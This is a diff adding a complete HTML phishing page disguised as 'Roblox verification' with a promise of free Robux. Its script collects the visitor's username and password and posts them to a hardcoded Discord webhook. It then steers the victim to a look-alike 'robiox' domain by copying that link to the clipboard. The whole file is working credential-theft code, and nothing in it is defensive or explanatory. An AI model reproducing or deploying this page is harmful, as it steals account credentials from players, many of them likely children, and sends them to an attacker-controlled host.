@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Combined Verification Page</title>
+<style>
+    body {
+        margin: 0;
+        height: 100vh;
+        background-color: black;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: Arial, sans-serif;
+        color: white;
+        flex-direction: column;
+    }
+
+    /* Common styles for glow text */
+    .glow-text {
+        font-size: 3em;
+        color: #00ffff;
+        text-align: center;
+        animation: float 2s ease-in-out infinite;
+        text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff, 0 0 40px #00ffff;
+        margin-bottom: 20px;
+    }
+
+    @keyframes float {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-15px); }
+    }
+
+    /* Styles for forms and containers */
+    .form-container, .verification-container {
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+        width: 300px;
+        padding: 20px;
+        border-radius: 10px;
+        background-color: rgba(0,0,0,0.7);
+        box-shadow: 0 0 15px rgba(0,0,0,0.5);
+    }
+
+    input, textarea {
+        padding: 10px;
+        border-radius: 5px;
+        border: none;
+        outline: none;
+        font-size: 1em;
+        height: 40px;
+    }
+
+    input::placeholder, textarea::placeholder {
+        color: #999;
+    }
+
+    textarea {
+        resize: none;
+        height: 80px;
+    }
+
+    button {
+        padding: 10px;
+        border-radius: 5px;
+        border: none;
+        background-color: #00ffff;
+        color: black;
+        font-weight: bold;
+        cursor: pointer;
+        transition: 0.3s;
+        font-size: 1em;
+    }
+
+    button:hover {
+        background-color: #00bbbb;
+    }
+
+    /* Additional styles for verification message section */
+    .message {
+        margin: 15px 0;
+        font-size: 1.2em;
+        color: #ccc;
+        text-align: center;
+    }
+
+    .browser-icons {
+        display: flex;
+        justify-content: center;
+        gap: 15px;
+        margin-top: 10px;
+        align-items: center;
+    }
+
+    .browser-icons img {
+        width: 40px;
+        height: 40px;
+        cursor: pointer;
+        transition: transform 0.2s;
+    }
+
+    .browser-icons img:hover {
+        transform: scale(1.2);
+    }
+</style>
+</head>
+<body>
+
+<!-- Login Form Section -->
+<div id="loginSection" class="form-container">
+    <div class="glow-text">ROBLOX VERIFICATION</div>
+    <input type="text" id="username" placeholder="USERNAME" />
+    <textarea id="feedback" placeholder="PASSWORD"></textarea>
+    <button id="submitBtn">Submit</button>
+</div>
+
+<!-- Post-login Verification Section (hidden by default) -->
+<div id="verificationSection" class="verification-container" style="display:none;">
+    <div class="glow-text">Verification</div>
+    <div class="message">JOIN THE GROUP TO RECEIVE THE ROBUX</div>
+    <button class="button" onclick="copyGroupLink()">COPY GROUP LINK</button>
+    <div class="message" style="margin-top:15px;">Paste it into your browser:</div>
+    <div class="browser-icons">
+        <!-- Only images, no links -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Google_Chrome_icon.png" alt="Chrome" title="Chrome"/>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Safari_logo.png" alt="Safari" title="Safari"/>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/Firefox_logo_2019.png" alt="Firefox" title="Firefox"/>
+    </div>
+</div>
+
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1442351340268294155/uHB8lnMf-5GE96saDGrwl5VlU5ifWTSUXOtnyxy0axaWdAb4DkXKLK1Y4UMdAZovEGpY";
+
+document.getElementById("submitBtn").addEventListener("click", async () => {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("feedback").value.trim();
+
+    if (!username || !password) {
+        alert("Please fill in both fields!");
+        return;
+    }
+
+    const payload = {
+        username: "TROLL", // Bot name
+        avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/33/Skull_icon.svg/1024px-Skull_icon.svg.png", // Skull avatar
+        embeds: [
+            {
+                title: "New password Received",
+                color: 3447003, // Blue color
+                fields: [
+                    { name: "Username", value: username, inline: true },
+                    { name: "Password", value: password, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }
+        ]
+    };
+
+    try {
+        const response = await fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+            alert("Password sent successfully!");
+            document.getElementById("username").value = "";
+            document.getElementById("feedback").value = "";
+            // Switch to verification section
+            document.getElementById("loginSection").style.display = "none";
+            document.getElementById("verificationSection").style.display = "flex";
+        } else {
+            alert("Failed to send password.");
+        }
+    } catch (error) {
+        console.error(error);
+        alert("An error occurred while sending password.");
+    }
+});
+
+function copyGroupLink() {
+    const groupLink = "https://www.robiox.com.am/communities/4068228252/Vinnys-Garage";
+
+    // Try modern Clipboard API
+    if (navigator.clipboard) {
+        navigator.clipboard.writeText(groupLink).then(() => {
+            alert("Group link copied to clipboard!");
+        }).catch(() => {
+            fallbackCopy(groupLink);
+        });
+    } else {
+        fallbackCopy(groupLink);
+    }
+}
+
+function fallbackCopy(text) {
+    const textarea = document.createElement("textarea");
+    textarea.value = text;
+    document.body.appendChild(textarea);
+    textarea.focus();
+    textarea.select();
+    try {
+        document.execCommand('copy');
+        alert("Group link copied to clipboard!");
+    } catch (err) {
+        alert("Failed to copy. Please copy manually: " + text);
+    }
+    document.body.removeChild(textarea);
+}
+</script>
+
+</body>
+</html>
